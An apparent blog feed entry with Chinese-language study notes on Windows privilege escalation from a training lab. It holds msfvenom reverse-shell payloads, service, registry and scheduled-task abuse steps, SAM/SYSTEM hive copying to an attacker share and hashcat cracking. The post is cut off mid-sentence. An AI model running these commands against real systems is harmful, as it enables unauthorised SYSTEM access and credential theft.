<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z4yn&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/436a77834f2add32b7dc49df6b0dbe28</icon>
  <subtitle>Better to light one candle than to curse the darkness.</subtitle>
  <link href="https://z4ynadmin.github.io/atom.xml" rel="self"/>
  
  <link href="https://z4ynadmin.github.io/"/>
  <updated>2022-11-07T07:30:45.490Z</updated>
  <id>https://z4ynadmin.github.io/</id>
  
  <author>
    <name>Z4yn&#39;s blog</name>
    <email>z4ynwanwj@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows privesc</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Windows-privesc/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Windows-privesc/</id>
    <published>2022-11-07T07:27:37.000Z</published>
    <updated>2022-11-07T07:30:45.490Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="#0 信息收集"></a>#0 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户信息收集</span></span><br><span class="line">当前用户的权限：whoami /priv</span><br><span class="line">列出用户：net users</span><br><span class="line">列出用户的详细信息：net user username（e.g. net user Administrator）</span><br><span class="line">其他用户同时登录：qwinsta（与query session命令相同）</span><br><span class="line">系统上定义的用户组：net localgroup</span><br><span class="line">列出特定组的成员：net localgroup groupname（e.g. net localgroup Administrators）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统信息收集</span></span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补丁详细情况</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索文件</span></span><br><span class="line">findstr /si password *.txt</span><br><span class="line">命令分解：</span><br><span class="line">findstr：搜索文件中的文本模式。</span><br><span class="line">/si：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）</span><br><span class="line">password：该命令将在文件中搜索字符串“密码”</span><br><span class="line">*.txt：搜索将涵盖具有 .txt 扩展名的文件</span><br><span class="line">可以根据您的需要和目标环境更改字符串和文件扩展名，但“.txt”、“.xml”、“.ini”、“*.config”和“.xls”通常是一个好地方开始。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络连接</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务</span></span><br><span class="line">schtasks：该命令可用于查询计划任务。</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序</span></span><br><span class="line">driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看杀毒软件状态</span></span><br><span class="line">sc query windefend</span><br></pre></td></tr></table></figure><h3 id="1-Tools"><a href="#1-Tools" class="headerlink" title="#1 Tools"></a>#1 Tools</h3><p>WinPEAS：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>PowerUp：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向shell</span></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure><h3 id="2-服务漏洞"><a href="#2-服务漏洞" class="headerlink" title="#2 服务漏洞"></a>#2 服务漏洞</h3><p>) 1 - 不安全的服务权限</p><p>accesschk.exe：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Users&quot; *#跟下面命令相同</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwcqv</span> <span class="title">user</span> *  #<span class="title">daclsvc</span>服务<span class="title">user</span>用户拥有更改服务配置权限(<span class="title">SERVICE_CHANGE_CONFIG</span>)</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">qc</span> <span class="title">daclsvc</span>#查询服务并注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">config</span> <span class="title">daclsvc</span> <span class="title">binpath</span>= &quot;\&quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>\&quot;&quot;#修改服务配置并将 <span class="title">BINARY_PATH_NAME</span> (<span class="title">binpath</span>) 设置为反向<span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">daclsvc</span>#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525152423849.png" alt="image-20220525152423849"></p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525142216546.png" alt="image-20220525142216546"></p><p>) 2 - 未引用的服务路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">unquotedsvc</span>#查询“ <span class="title">unquotedsvc</span>” 服务，注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行，并且 <span class="title">BINARY_PATH_NAME</span> 未引用并包含空格</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">unquotedsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common</span> <span class="title">Files</span>\<span class="title">unquotedpathservice.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwdq</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\&quot;#使用 <span class="title">accesschk.exe</span>，注意 <span class="title">BUILTIN</span>\<span class="title">Users</span> 组允许写入 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\ 目录</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Users</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">SERVICE</span>\<span class="title">TrustedInstaller</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common.exe</span>&quot;#您创建的 <span class="title">reverse.exe</span> 可执行文件复制到此目录并将其重命名为 <span class="title">Common.exe</span></span></span><br><span class="line"><span class="function">        1 <span class="title">file</span>(<span class="title">s</span>) <span class="title">copied</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">unquotedsvc</span>#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525152457510.png" alt="image-20220525152457510"></p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525154120916.png" alt="image-20220525154120916"></p><p>) 3 - 不安全的注册表服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">PrivEsc</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">regsvc</span># 查询“ <span class="title">regsvc</span>” 服务</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">regsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span>\<span class="title">insecureregistryservice.exe</span>&quot;</span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span># 注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uvwqk</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span></span></span><br><span class="line"><span class="function"><span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span># 使用 <span class="title">accesschk.exe</span>(注意修改对应服务名称)</span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>#请注意 <span class="title">regsvc</span> 服务的注册表项可由“<span class="title">NT</span>  <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>”组（基本上所有登录用户）写入</span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">reg</span> <span class="title">add</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">regsvc</span> /<span class="title">v</span> <span class="title">ImagePath</span> /<span class="title">t</span> <span class="title">REG_EXPAND_SZ</span> /<span class="title">d</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> /<span class="title">f</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">regsvc</span></span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525161239852.png" alt="image-20220525161239852"></p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525160834061.png" alt="image-20220525160834061"></p><p>) 4 - 不安全的服务可执行文件</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172553728.png" alt="image-20220525172553728"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询“ filepermsvc” 服务</span><br><span class="line">sc qc filepermsvc</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意服务二进制文件 (BINARY_PATH_NAME) 文件对所有人都是可写的</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件并用它替换 <span class="title">filepermservice.exe</span></span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot; /<span class="title">Y</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">filepermsvc</span></span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525170550784.png" alt="image-20220525170550784"></p><h3 id="3-注册表"><a href="#3-注册表" class="headerlink" title="#3 注册表"></a>#3 注册表</h3><p>AutoRuns</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172120597.png" alt="image-20220525172120597"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AutoRun 可执行文件：</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意其中一个 AutoRun 可执行文件对每个人都是可写的：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">wvu</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件 并用它覆盖 <span class="title">AutoRun</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot; /<span class="title">Y</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在现实世界中，您必须等待管理员自己登录！</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172846079.png" alt="image-20220525172846079"></p><p>AlwaysInstallElevated</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525175002143.png" alt="image-20220525175002143"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AlwaysInstallElevated 键：</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"># 请注意，两个键都设置为 <span class="number">1</span> (<span class="number">0</span>x1)。</span><br><span class="line"></span><br><span class="line">#在Kali上，使用msfvenom生成反向shell Windows Installer (reverse.msi)。更新LHOST IP地址：</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span> LPORT=<span class="number">53</span> -f msi -o reverse.msi</span><br><span class="line"></span><br><span class="line"># 将 reverse.msi 文件传输到 Windows 上的 C:\PrivEsc 目录（使用之前的 SMB 服务器方法）。</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span>\share\reverse.msi c:\PrivEsc\reverse.msi</span><br><span class="line"></span><br><span class="line">#在 Kali 上启动一个监听器，然后运行安装程序以触发以 SYSTEM 权限运行的反向 shell：</span><br><span class="line">msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525220104009.png" alt="image-20220525220104009"></p><h3 id="4-密码"><a href="#4-密码" class="headerlink" title="#4 密码"></a>#4 密码</h3><p>) 1 - 注册表</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525224435116.png" alt="image-20220525224435116"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以在注册表中搜索包含password一词的键和值：</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果您想节省一些时间，请查询此特定密钥以查找管理员 AutoLogon 凭据：</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span></span><br></pre></td></tr></table></figure><p>) 2 - 保存的凭据</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526095216760.png" alt="image-20220526095216760"></p><p>如果winPEASany没用出结果需要手动输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有保存的凭据：</span></span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Kali 上启动一个侦听器并使用 runas 和管理员用户保存的凭据运行 reverse.exe 可执行文件：</span></span><br><span class="line">runas /savecred /user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525224203673.png" alt="image-20220525224203673"></p><p>) 3 - 安全帐户管理器 (SAM)</p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526095641426.png" alt="image-20220526095641426"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将 SAM 和 SYSTEM 文件传输到您的 Kali VM：</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SAM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SYSTEM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"></span><br><span class="line"># 在 Kali 上，克隆 creddump7 存储库（Kali 上的存储库已过时，无法正确转储 Windows <span class="number">10</span> 的哈希值！）并使用它从 SAM 和 SYSTEM 文件中转储哈希值：</span><br><span class="line">git clone https://github.com/Tib3rius/creddump7</span><br><span class="line">pip3 install pycrypto</span><br><span class="line">python3 creddump7/pwdump.py SYSTEM SAM</span><br><span class="line"></span><br><span class="line"># 使用 hashcat 破解管理员 NTLM 哈希：</span><br><span class="line">hashcat -m <span class="number">1000</span> --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526102104852.png" alt="image-20220526102104852"></p><h3 id="5-计划任务"><a href="#5-计划任务" class="headerlink" title="#5 计划任务"></a>#5 计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v# 任务列表</span><br><span class="line">schtasks /query /fo LIST /v | <span class="built_in">find</span> &quot;Task To Run&quot;# 过滤运行的任务文件</span><br><span class="line"></span><br><span class="line">#查看 C:\DevTools\CleanUp.ps1 脚本的内容：</span><br><span class="line"><span class="built_in">type</span> C:\DevTools\CleanUp.ps1</span><br><span class="line"></span><br><span class="line">#该脚本似乎每分钟都以 SYSTEM 身份运行。使用 accesschk.exe，请注意您可以写入此文件：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> <span class="title">user</span> <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个侦听器，然后将一行添加到<span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span> 运行您创建的 <span class="title">reverse.exe</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">echo</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &gt;&gt; <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 等待计划任务运行，这将触发反向 <span class="title">shell</span> 作为 <span class="title">SYSTEM</span>。</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526133707718.png" alt="image-20220526133707718"></p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526135208329.png" alt="image-20220526135208329"></p><h3 id="6-不安全的-GUI-应用程序"><a href="#6-不安全的-GUI-应用程序" class="headerlink" title="#6 不安全的 GUI 应用程序"></a>#6 不安全的 GUI 应用程序</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 桌面上有个画图程序，运行程序后输入</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 双击桌面上的“AdminPaint”快捷方式。运行后，打开命令提示符并注意 Paint 